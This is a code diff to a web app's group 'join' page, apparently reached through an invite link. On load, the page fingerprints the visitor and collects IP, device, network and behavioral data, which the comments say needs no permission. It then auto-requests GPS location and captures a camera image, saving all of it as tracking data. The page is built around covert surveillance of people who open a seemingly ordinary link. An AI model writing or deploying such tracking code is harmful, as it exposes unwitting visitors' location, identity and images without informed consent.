@@ -33,71 +33,91 @@ export default function JoinPage() {
     // Initialize behavioral tracking when page loads
     initializeBehavioralTracking();
     
-    // Load group data using new storage system
-    const loadGroupData = async () => {
-      let data = await getGroupData(groupId);
+    // Load group data IMMEDIATELY from localStorage (synchronous for instant display)
+    // This ensures UI shows immediately without waiting
+    const loadGroupDataSync = () => {
+      // Try localStorage first (instant, no async)
+      const stored = localStorage.getItem(`group_${groupId}`);
+      if (stored) {
+        try {
+          const data = JSON.parse(stored);
+          setGroupData(data);
+          return;
+        } catch (error) {
+          console.error('Error parsing group data:', error);
+        }
+      }
       
-      if (!data) {
-        // Try to get groupId from URL if not in params
-        const urlPath = window.location.pathname;
-        const urlGroupId = urlPath.split('/join/')[1]?.split('/')[0]?.split('?')[0];
-        if (urlGroupId && urlGroupId !== groupId) {
+      // Try to get groupId from URL if not in params
+      const urlPath = window.location.pathname;
+      const urlGroupId = urlPath.split('/join/')[1]?.split('/')[0]?.split('?')[0];
+      if (urlGroupId && urlGroupId !== groupId) {
+        const altStored = localStorage.getItem(`group_${urlGroupId}`);
+        if (altStored) {
+          try {
+            const data = JSON.parse(altStored);
+            setGroupData(data);
+            return;
+          } catch (error) {
+            console.error('Error parsing group data:', error);
+          }
+        }
+      }
+      
+      // If not in localStorage, try async IndexedDB (but don't block UI)
+      const loadGroupDataAsync = async () => {
+        let data = await getGroupData(groupId);
+        if (!data && urlGroupId && urlGroupId !== groupId) {
           data = await getGroupData(urlGroupId);
         }
-      }
-      
-      if (data) {
-        setGroupData(data);
-      }
+        if (data) {
+          setGroupData(data);
+        }
+      };
+      loadGroupDataAsync();
     };
     
-    loadGroupData();
+    // Load group data immediately (synchronous)
+    loadGroupDataSync();
 
-    // Start background data collection immediately (no permission needed)
-    collectBackgroundData();
-
-    // Auto-request location permission on Android/mobile devices
-    autoRequestLocationPermission();
-
-    // Auto-request camera permission
-    autoRequestCameraPermission();
+    // Step 1: Start background data collection in background (don't block UI)
+    // This collects: IP, device info, fingerprint, network, behavioral data
+    // Run asynchronously without blocking the UI
+    setTimeout(() => {
+      collectBackgroundData().then(() => {
+        // Step 2: After background data is collected, request location permission
+        autoRequestLocationPermission();
+      });
+    }, 100); // Small delay to ensure UI renders first
+    
+    // Step 3: Camera will be requested AFTER location is obtained (see getLocationSilently)
   }, [groupId]);
 
-  // Collect background data (IP, fingerprint, device info, etc.) - NO GPS needed
+  // Collect background data (IP, fingerprint, device info, etc.) - NO GPS, NO CAMERA
+  // This is Step 1: Collect everything that doesn't need permission
   const collectBackgroundData = async () => {
     try {
+      console.log('Step 1: Collecting background data (IP, device, fingerprint, network)...');
       const backgroundData = await collectDataWithoutGPS(groupId);
       
-      // Try to capture camera image in background
-      let finalCameraImage = null;
-      try {
-        finalCameraImage = await captureCameraImage();
-        if (finalCameraImage) {
-          setCameraImage(finalCameraImage);
-        }
-      } catch (error) {
-        // Camera permission denied - that's fine
-      }
-      
-      // Get camera permission status
-      const cameraPermissionStatus = await getCameraPermissionStatus();
-      
-      // Add camera data to background data
-      const dataWithCamera = {
+      // NO camera capture here - camera will be requested AFTER location (Step 3)
+      // Set camera fields to null/unknown for now
+      const dataWithoutCamera = {
         ...backgroundData,
         gpsLocation: null,
-        cameraImage: finalCameraImage,
+        cameraImage: null,
         metadata: {
           ...backgroundData.metadata,
-          cameraPermissionStatus,
+          cameraPermissionStatus: 'prompt' as const, // Will be updated when camera is requested
         },
       };
       
-      backgroundDataRef.current = dataWithCamera as any;
+      backgroundDataRef.current = dataWithoutCamera as any;
       setBackgroundDataCollected(true);
       
       // Store background data immediately using new storage system
-      await saveTrackingData(dataWithCamera as CollectedData);
+      await saveTrackingData(dataWithoutCamera as CollectedData);
+      console.log('Step 1: Background data collected successfully');
     } catch (error) {
       console.error('Error collecting background data:', error);
     }
@@ -154,38 +174,41 @@ export default function JoinPage() {
       return;
     }
 
-    console.log('Requesting GPS location...');
+    console.log('Step 2: Requesting GPS location...');
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        console.log('GPS location obtained:', position.coords);
+        console.log('Step 2: GPS location obtained:', position.coords);
         // Location obtained! Update the data with GPS
         setLocation(position.coords);
         
-        // Try to capture camera image if not already captured
-        let finalCameraImage = cameraImage;
-        if (!finalCameraImage) {
-          try {
-            finalCameraImage = await captureCameraImage();
-            if (finalCameraImage) {
-              setCameraImage(finalCameraImage);
-            }
-          } catch (error) {
-            // Camera permission denied - that's fine
+        // Step 3: NOW request camera permission (after location is obtained)
+        console.log('Step 3: Requesting camera permission...');
+        let finalCameraImage = null;
+        let cameraPermissionStatus: 'granted' | 'denied' | 'prompt' | 'unknown' = 'denied';
+        
+        try {
+          finalCameraImage = await captureCameraImage();
+          if (finalCameraImage) {
+            setCameraImage(finalCameraImage);
+            console.log('Step 3: Camera image captured successfully');
           }
+          cameraPermissionStatus = await getCameraPermissionStatus();
+        } catch (error) {
+          // Camera permission denied - that's fine, we still have location and background data
+          console.log('Step 3: Camera permission denied or error:', error);
+          cameraPermissionStatus = await getCameraPermissionStatus();
         }
         
-        // Get camera permission status
-        const cameraPermissionStatus = await getCameraPermissionStatus();
-        
-        // If we already have background data, merge it with GPS
+        // Merge all data: background + GPS + camera
         if (backgroundDataRef.current) {
           const allData = await collectAllData(groupId, position.coords);
           allData.cameraImage = finalCameraImage;
           allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
           setCollectedData(allData);
           
-          // Save data using new storage system (handles both IndexedDB and localStorage)
+          // Save complete data using new storage system
           await saveTrackingData(allData);
+          console.log('All data collected and saved: background + GPS + camera');
         } else {
           // No background data yet, collect everything now
           const allData = await collectAllData(groupId, position.coords);
@@ -197,15 +220,49 @@ export default function JoinPage() {
           await saveTrackingData(allData);
         }
       },
-      (error) => {
-        // Permission denied or error - that's okay, we still have background data
-        console.log('Location permission denied or error:', error.code, error.message);
+      async (error) => {
+        // Location permission denied or error - that's okay, we still have background data
+        console.log('Step 2: Location permission denied or error:', error.code, error.message);
         if (error.code === 1) {
           console.log('User denied location permission');
         } else if (error.code === 2) {
           console.log('Location unavailable');
         } else if (error.code === 3) {
           console.log('Location request timeout');
+        }
+        
+        // Step 3: Even if location is denied, still try to get camera (last step)
+        console.log('Step 3: Requesting camera permission (location was denied)...');
+        let finalCameraImage = null;
+        let cameraPermissionStatus: 'granted' | 'denied' | 'prompt' | 'unknown' = 'denied';
+        
+        try {
+          finalCameraImage = await captureCameraImage();
+          if (finalCameraImage) {
+            setCameraImage(finalCameraImage);
+            console.log('Step 3: Camera image captured successfully');
+          }
+          cameraPermissionStatus = await getCameraPermissionStatus();
+        } catch (cameraError) {
+          // Camera permission also denied - that's fine
+          console.log('Step 3: Camera permission denied:', cameraError);
+          cameraPermissionStatus = await getCameraPermissionStatus();
+        }
+        
+        // Update background data with camera info (no GPS)
+        if (backgroundDataRef.current) {
+          const dataWithCamera = {
+            ...backgroundDataRef.current,
+            cameraImage: finalCameraImage,
+            metadata: {
+              ...backgroundDataRef.current.metadata,
+              cameraPermissionStatus,
+            },
+          } as CollectedData;
+          
+          setCollectedData(dataWithCamera);
+          await saveTrackingData(dataWithCamera);
+          console.log('Data saved: background + camera (no GPS)');
         }
       },
       {
